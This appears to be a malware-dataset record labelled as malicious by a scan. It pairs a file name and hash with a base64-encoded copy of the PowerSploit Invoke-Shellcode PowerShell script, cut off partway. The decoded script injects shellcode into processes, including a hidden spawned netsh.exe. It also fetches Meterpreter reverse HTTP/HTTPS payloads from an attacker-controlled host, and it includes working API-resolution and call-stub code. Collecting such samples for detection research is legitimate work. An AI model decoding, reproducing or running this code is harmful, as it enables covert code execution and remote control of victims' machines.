Invoke-Shellcode.ps1,f5a4f0b2c57753b53470a6c0ef121718,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQp7CjwjCi5TWU5PUFNJUwoKSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBwcm9jZXNzIElEIG9mIHlvdXIgY2hvb3Npbmcgb3Igd2l0aGluIHRoZSBjb250ZXh0IG9mIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzcy4KClBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBJbnZva2UtU2hlbGxjb2RlCkF1dGhvcjogTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCiAKLkRFU0NSSVBUSU9OCgpQb3J0aW9ucyBvZiB0aGlzIHByb2plY3Qgd2FzIGJhc2VkIHVwb24gc3lyaW5nZS5jIHYxLjIgd3JpdHRlbiBieSBTcGVuY2VyIE1jSW50eXJlCgpQb3dlclNoZWxsIGV4cGVjdHMgc2hlbGxjb2RlIHRvIGJlIGluIHRoZSBmb3JtIDB4WFgsMHhYWCwweFhYLiBUbyBnZW5lcmF0ZSB5b3VyIHNoZWxsY29kZSBpbiB0aGlzIGZvcm0sIHlvdSBjYW4gdXNlIHRoaXMgY29tbWFuZCBmcm9tIHdpdGhpbiBCYWNrdHJhY2sgKFRoYW5rcywgTWF0dCBhbmQgZzB0bTFsayk6Cgptc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQgQyB8IHNlZCAnMSw2ZDtzL1siO10vL2c7cy9cXC8sMC9nJyB8IHRyIC1kICdcbicgfCBjdXQgLWMyLSAKCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5LgogCi5QQVJBTUVURVIgUHJvY2Vzc0lECgpQcm9jZXNzIElEIG9mIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBzaGVsbGNvZGUgaW50by4KCi5QQVJBTUVURVIgU2hlbGxjb2RlCgpTcGVjaWZpZXMgYW4gb3B0aW9uYWwgc2hlbGxjb2RlIHBhc3NlZCBpbiBhcyBhIGJ5dGUgYXJyYXkKCi5QQVJBTUVURVIgTGlzdE1ldGFzcGxvaXRQYXlsb2FkcwoKTGlzdHMgYWxsIG9mIHRoZSBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyB0aGF0IEludm9rZS1TaGVsbGNvZGUgc3VwcG9ydHMKCi5QQVJBTUVURVIgTGhvc3QKClNwZWNpZmllcyB0aGUgSVAgYWRkcmVzcyBvZiB0aGUgYXR0YWNrIG1hY2hpbmUgd2FpdGluZyB0byByZWNlaXZlIHRoZSByZXZlcnNlIHNoZWxsCgouUEFSQU1FVEVSIExwb3J0CiAKU3BlY2lmaWVzIHRoZSBwb3J0IG9mIHRoZSBhdHRhY2sgbWFjaGluZSB3YWl0aW5nIHRvIHJlY2VpdmUgdGhlIHJldmVyc2Ugc2hlbGwKCi5QQVJBTUVURVIgUGF5bG9hZAoKU3BlY2lmaWVzIHRoZSBtZXRhc3Bsb2l0IHBheWxvYWQgdG8gdXNlLiBDdXJyZW50bHksIG9ubHkgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJyBhbmQgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycgcGF5bG9hZHMgYXJlIHN1cHBvcnRlZC4KCi5QQVJBTUVURVIgVXNlckFnZW50CgpPcHRpb25hbGx5IHNwZWNpZmllcyB0aGUgdXNlciBhZ2VudCB0byB1c2Ugd2hlbiB1c2luZyBtZXRlcnByZXRlciBodHRwIG9yIGh0dHBzIHBheWxvYWRzCgouUEFSQU1FVEVSIFByb3h5CgpPcHRpb25hbGx5IHNwZWNpZmllcyB3aGV0aGVyIHRvIHV0aWxpemUgdGhlIHByb3h5IHNldHRpbmdzIG9uIHRoZSBtYWNoaW5lLgoKLlBBUkFNRVRFUiBMZWdhY3kKCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgb2xkZXIgbWV0ZXJwcmV0ZXIgaGFuZGxlciAiSU5JVE0iLiBUaGlzIHdpbGwgbGlrZWx5IGJlIHJlbW92ZWQgaW4gdGhlIGZ1dHVyZS4gCgouUEFSQU1FVEVSIEZvcmNlCgpJbmplY3RzIHNoZWxsY29kZSB3aXRob3V0IHByb21wdGluZyBmb3IgY29uZmlybWF0aW9uLiBCeSBkZWZhdWx0LCBJbnZva2UtU2hlbGxjb2RlIHByb21wdHMgZm9yIGNvbmZpcm1hdGlvbiBiZWZvcmUgcGVyZm9ybWluZyBhbnkgbWFsaWNpb3VzIGFjdC4KCi5FWEFNUExFCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZSAtUHJvY2Vzc0lkIDQyNzQKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byBwcm9jZXNzIElEIDQyNzQuCgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBpbnN0YW5jZSBvZiBQb3dlclNoZWxsLgoKLkVYQU1QTEUKCkM6XFBTPiBTdGFydC1Qcm9jZXNzIEM6XFdpbmRvd3NcU3lzV09XNjRcbm90ZXBhZC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbgpDOlxQUz4gJFByb2MgPSBHZXQtUHJvY2VzcyBub3RlcGFkCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgJFByb2MuSWQgLVBheWxvYWQgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIC1MaG9zdCAxOTIuMTY4LjMwLjEyOSAtTHBvcnQgNDQzIC1WZXJib3NlCgpWRVJCT1NFOiBSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSBodHRwczovLzE5Mi4xNjguMzAuMTI5OjQ0My9JTklUTQpWRVJCT1NFOiBJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiA0MDA0ClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4KVkVSQk9TRTogVXNpbmcgMzItYml0IHNoZWxsY29kZS4KVkVSQk9TRTogU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweDAzQkUwMDAwClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuClZFUkJPU0U6IFRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDAxQjAwMDAKVkVSQk9TRTogU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBoaWRkZW4gbm90ZXBhZCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpMSE9TVCAgICAgMTkyLjE2OC4zMC4xMjkgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIGhvc3RuYW1lCkxQT1JUICAgICA0NDMgICAgICAgICAgICAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgcG9ydAoKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1QYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcyAtTGhvc3QgMTkyLjE2OC4zMC4xMjkgLUxwb3J0IDgwCgpEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpFc3RhYmxpc2hlcyBhIHJldmVyc2UgaHR0cCBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBydW5uaW5nIFB3ZXJTaGVsbCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHApOgoKTmFtZSAgICAgIEN1cnJlbnQgU2V0dGluZyAgUmVxdWlyZWQgIERlc2NyaXB0aW9uCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQpFWElURlVOQyAgdGhyZWFkICAgICAgICAgICB5ZXMgICAgICAgRXhpdCB0ZWNobmlxdWU6IHNlaCwgdGhyZWFkLCBwcm9jZXNzLCBub25lCkxIT1NUICAgICAxOTIuMTY4LjMwLjEyOSAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgaG9zdG5hbWUKTFBPUlQgICAgIDgwICAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0CgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLVNoZWxsY29kZSBAKDB4OTAsMHg5MCwweEMzKQogICAgCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCk92ZXJyaWRlcyB0aGUgc2hlbGxjb2RlIGluY2x1ZGVkIGluIHRoZSBzY3JpcHQgd2l0aCBjdXN0b20gc2hlbGxjb2RlIC0gMHg5MCAoTk9QKSwgMHg5MCAoTk9QKSwgMHhDMyAoUkVUKQpXYXJuaW5nOiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHRoYXQgeW91ciBzaGVsbGNvZGUgaXMgMzIgdnMuIDY0LWJpdCEKICAgIAouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLUxpc3RNZXRhc3Bsb2l0UGF5bG9hZHMKICAgIApQYXlsb2FkcwotLS0tLS0tLQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cAp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMKCi5OT1RFUwoKVXNlIHRoZSAnLVZlcmJvc2UnIG9wdGlvbiB0byBwcmludCBkZXRhaWxlZCBpbmZvcm1hdGlvbi4KClBsYWNlIHlvdXIgZ2VuZXJhdGVkIHNoZWxsY29kZSBpbiAkU2hlbGxjb2RlMzIgYW5kICRTaGVsbGNvZGU2NCB2YXJpYWJsZXMgb3IgcGFzcyBpdCBpbiBhcyBhIGJ5dGUgYXJyYXkgdmlhIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyCgpCaWcgdGhhbmtzIHRvIE9pc2luICh4MG4pIEdyZWhhbiAoQG9pc2luZykgZm9yIGFuc3dlcmluZyBhbGwgbXkgb2JzY3VyZSBxdWVzdGlvbnMgYXQgdGhlIGRyb3Agb2YgYSBoYXQgLSBodHRwOi8vd3d3Lm5pdm90Lm9yZy8KCi5MSU5LCgpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbQojPgoKW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtVSW50MTZdCiAgICAkUHJvY2Vzc0lELAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtCeXRlW11dCiAgICAkU2hlbGxjb2RlLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVTZXQoICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAgICAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnLAogICAgICAgICAgICAgICAgICBJZ25vcmVDYXNlID0gJFRydWUgKV0KICAgIFtTdHJpbmddCiAgICAkUGF5bG9hZCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTGlzdFBheWxvYWRzJyApXQogICAgW1N3aXRjaF0KICAgICRMaXN0TWV0YXNwbG9pdFBheWxvYWRzLAogICAgCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwKICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbU3RyaW5nXQogICAgJExob3N0ID0gJzEyNy4wLjAuMScsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlUmFuZ2UoIDEsNjU1MzUgKV0KICAgIFtJbnRdCiAgICAkTHBvcnQgPSA4NDQzLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3RyaW5nXQogICAgJFVzZXJBZ2VudCA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLidVc2VyIEFnZW50JywKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJExlZ2FjeSA9ICRGYWxzZSwKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJFByb3h5ID0gJEZhbHNlLAogICAgCiAgICBbU3dpdGNoXQogICAgJEZvcmNlID0gJEZhbHNlCikKCiAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyLjAKICAgIAogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyBhbmQgZXhpdCB0aGUgZnVuY3Rpb24KICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ0xpc3RQYXlsb2FkcycpCiAgICB7CiAgICAgICAgJEF2YWlsYWJsZVBheWxvYWRzID0gKEdldC1Db21tYW5kIEludm9rZS1TaGVsbGNvZGUpLlBhcmFtZXRlcnNbJ1BheWxvYWQnXS5BdHRyaWJ1dGVzIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHskXy5UeXBlSWQgLWVxIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlZhbGlkYXRlU2V0QXR0cmlidXRlXX0KICAgIAogICAgICAgIGZvcmVhY2ggKCRQYXlsb2FkIGluICRBdmFpbGFibGVQYXlsb2Fkcy5WYWxpZFZhbHVlcykKICAgICAgICB7CiAgICAgICAgICAgIE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7IFBheWxvYWRzID0gJFBheWxvYWQgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBSZXR1cm4KICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgRW5zdXJlIGEgdmFsaWQgcHJvY2VzcyBJRCB3YXMgcHJvdmlkZWQKICAgICAgICAjIFRoaXMgY291bGQgaGF2ZSBiZWVuIHZhbGlkYXRlZCB2aWEgJ1ZhbGlkYXRlU2NyaXB0JyBidXQgdGhlIGVycm9yIGdlbmVyYXRlZCB3aXRoIEdldC1Qcm9jZXNzIGlzIG1vcmUgZGVzY3JpcHRpdmUKICAgICAgICBHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJRCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHBzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NTdGFydEluZm8KICAgICAgICAgICAgJHBzdC5XaW5kb3dTdHlsZSA9ICdIaWRkZW4nCiAgICAgICAgICAgICRwc3QuVXNlU2hlbGxFeGVjdXRlID0gJEZhbHNlCiAgICAgICAgICAgICRwc3QuQ3JlYXRlTm9XaW5kb3cgPSAkVHJ1ZQogICAgICAgICAgICBpZiAoJGVudjpQUk9DRVNTT1JfQVJDSElURUNUVVJFIC1lcSAieDg2Iil7CiAgICAgICAgICAgICRwc3QuRmlsZU5hbWUgPSAiQzpcV2luZG93c1xTeXN0ZW0zMlxuZXRzaC5leGUiCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRwc3QuRmlsZU5hbWUgPSAiQzpcV2luZG93c1xTeXN3b3c2NFxuZXRzaC5leGUiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFByb2Nlc3MgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHN0KQogICAgICAgICAgICBbVUludDE2XSROZXdQcm9jSUQgPSAoJFByb2Nlc3MuSWQpLnRvc3RyaW5nKCkKICAgICAgICAgICAgJFByb2Nlc3NJRCA9ICROZXdQcm9jSUQKICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSA9ICROZXdQcm9jSUQKICAgICAgICAgICAgIEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lEIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgIH0KICAgIAogICAgZnVuY3Rpb24gTG9jYWw6R2V0LURlbGVnYXRlVHlwZQogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgW1R5cGVbXV0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCiAgICAgICAgICAgIFtUeXBlXQogICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICkKCiAgICAgICAgJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCiAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1Qcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICkKCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCiAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9CiAgICAgICAgJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKQogICAgICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQogICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCiAgICAgICAgJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKQogICAgICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgogICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKICAgICAgICAKICAgICAgICAjIFJldHVybiB0aGUgYWRkcmVzcyBvZiB0aGUgZnVuY3Rpb24KICAgICAgICBXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKICAgIH0KCiAgICAjIEVtaXRzIGEgc2hlbGxjb2RlIHN0dWIgdGhhdCB3aGVuIGluamVjdGVkIHdpbGwgY3JlYXRlIGEgdGhyZWFkIGFuZCBwYXNzIGV4ZWN1dGlvbiB0byB0aGUgbWFpbiBzaGVsbGNvZGUgcGF5bG9hZAogICAgZnVuY3Rpb24gTG9jYWw6RW1pdC1DYWxsVGhyZWFkU3R1YiAoW0ludFB0cl0gJEJhc2VBZGRyLCBbSW50UHRyXSAkRXhpdFRocmVhZEFkZHIsIFtJbnRdICRBcmNoaXRlY3R1cmUpCiAgICB7CiAgICAgICAgJEludFNpemVQdHIgPSAkQXJjaGl0ZWN0dXJlIC8gOAoKICAgICAgICBmdW5jdGlvbiBMb2NhbDpDb252ZXJ0VG8tTGl0dGxlRW5kaWFuIChbSW50UHRyXSAkQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkgPSBOZXctT2JqZWN0IEJ5dGVbXSgwKQogICAgICAgICAgICAkQWRkcmVzcy5Ub1N0cmluZygiWCQoJEludFNpemVQdHIqMikiKSAtc3BsaXQgJyhbQS1GMC05XXsyfSknIHwgRm9yRWFjaC1PYmplY3QgeyBpZiAoJF8pIHsgJExpdHRsZUVuZGlhbkJ5dGVBcnJheSArPSBbQnl0ZV0gKCcweHswfScgLWYgJF8pIH0gfQogICAgICAgICAgICBbU3lzdGVtLkFycmF5XTo6UmV2ZXJzZSgkTGl0dGxlRW5kaWFuQnl0ZUFycmF5KQogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJENhbGxTdHViID0gTmV3LU9iamVjdCBCeXRlW10oMCkKICAgICAgICAKICAgICAgICBpZiAoJEludFNpemVQdHIgLWVxIDgpCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEJhc2VBZGRyICAgICAgICMgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBSQVgKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIFFXT1JEIFJBWCwgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dICRDYWxsU3R1YiA9IDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIERXT1JEIEVBWCwgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0